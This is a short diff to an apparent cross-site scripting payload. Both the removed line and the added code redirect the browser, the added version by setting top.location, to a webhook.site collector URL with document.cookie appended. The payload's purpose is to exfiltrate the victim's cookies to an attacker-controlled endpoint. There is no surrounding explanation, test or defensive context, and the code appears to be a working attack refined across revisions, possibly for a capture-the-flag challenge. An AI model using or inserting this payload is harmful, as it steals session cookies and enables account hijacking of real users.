@@ -1,1 +1,4 @@
-location.href='https://webhook.site/5abc6336-7a19-44c0-b4af-3bc420dbf800?stage=final&c='+encodeURIComponent(document.cookie)
+(() => {
+  const W = "https://webhook.site/d1f8184d-054f-40c2-b6b6-ec4a050d6ac8";
+  top.location = W + "?stage=final&c=" + encodeURIComponent(document.cookie);
+})();
